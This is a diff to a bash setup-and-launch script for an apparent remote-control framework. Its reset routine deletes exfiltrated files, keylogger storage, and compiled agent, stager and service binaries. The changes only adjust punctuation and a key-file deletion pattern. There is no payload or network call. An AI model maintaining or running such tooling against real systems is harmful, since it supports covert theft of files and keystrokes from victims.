@@ -1,10 +1,10 @@
 #!/usr/bin/env bash
-# start_docker.sh — Full RCM stack setup and launch
+# start_docker.sh - Full RCM stack setup and launch
 # Generates certs, fixes permissions, and starts the server in one shot.
 #
 # Usage:
-#   ./start_docker.sh           — normal start
-#   ./start_docker.sh --reset   — wipe all persistent data, then start fresh
+#   ./start_docker.sh           - normal start
+#   ./start_docker.sh --reset   - wipe all persistent data, then start fresh
 set -euo pipefail
 
 # ── Colours ───────────────────────────────────────────────────────────
@@ -48,7 +48,7 @@ if $DO_RESET; then
     echo "    • downloads/         (all exfiltrated files)"
     echo "    • data/              (keylogger storage)"
     echo "    • logs/              (server logs)"
-    echo "    • dist/              (compiled agent binaries and server_keys.json)"
+    echo "    • dist/              (compiled agent binaries and server_keys*.json)"
     echo "    • history.txt        (CLI command history)"
     echo ""
     read -r -p "  Are you sure? [y/N] " confirm
@@ -79,7 +79,7 @@ if $DO_RESET; then
     success "Deleted downloads/, data/, logs/"
 
     must_sudo rm -f dist/*.exe dist/exe_* dist/dll_* dist/service_* dist/stager_* \
-          dist/server_keys.json 2>/dev/null || true
+          dist/server_keys.json dist/server_keys_*.json 2>/dev/null || true
     success "Deleted dist/ artifacts"
 
     rm -f history.txt
